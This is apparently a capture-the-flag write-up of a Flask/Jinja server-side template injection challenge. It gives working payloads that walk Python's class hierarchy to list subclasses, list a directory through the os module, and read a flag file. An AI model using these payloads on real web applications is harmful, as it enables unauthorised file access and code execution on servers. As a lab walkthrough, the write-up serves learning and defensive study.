# Web_python_template_injection

![Screenshot from 2021-07-25 18-08-42](https://user-images.githubusercontent.com/87865134/126896955-fc1c1441-180b-4daa-9181-fa172b318e12.png)

- Template: Flask/Jinja

## 1. Check Template Injection

![Screenshot from 2021-07-25 18-11-00](https://user-images.githubusercontent.com/87865134/126897023-cb8a1879-4247-4b7f-9448-785877ed0b59.png)

## 2. Injection code:
  - **List all class in python template:**  
    ```python
    {{().__class__.__bases__[0].__subclasses__()}}
    ```  
  ![Screenshot from 2021-07-25 18-15-21](https://user-images.githubusercontent.com/87865134/126897148-4edb3571-1544-4d6d-afa8-bc492fa7a88e.png)

  - **List file in current directory:**  
    ```python
    {{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
    ```  
   ![Screenshot from 2021-07-25 18-20-06](https://user-images.githubusercontent.com/87865134/126897262-84880017-207c-4c76-acae-f940d6d1580b.png)

  - **Read content of file fl4g:**  
    ```python
    {{().__class__.__bases__[0].__subclasses__()[40]('fl4g').read()}}
    ```   
   ![Screenshot from 2021-07-25 18-23-19](https://user-images.githubusercontent.com/87865134/126897330-df52606d-61db-4505-9307-fb81bed61ab9.png)

 ## - Decription:
  - > category: Server-side template injection
 
 ## - Reference:
  - [Python Built-in Types](https://docs.python.org/3/library/stdtypes.html#class.__bases__)
  - [Python magic method - HackTrick](https://book.hacktricks.xyz/misc/basic-python/magic-methods)
  - **__globals__**: A reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined
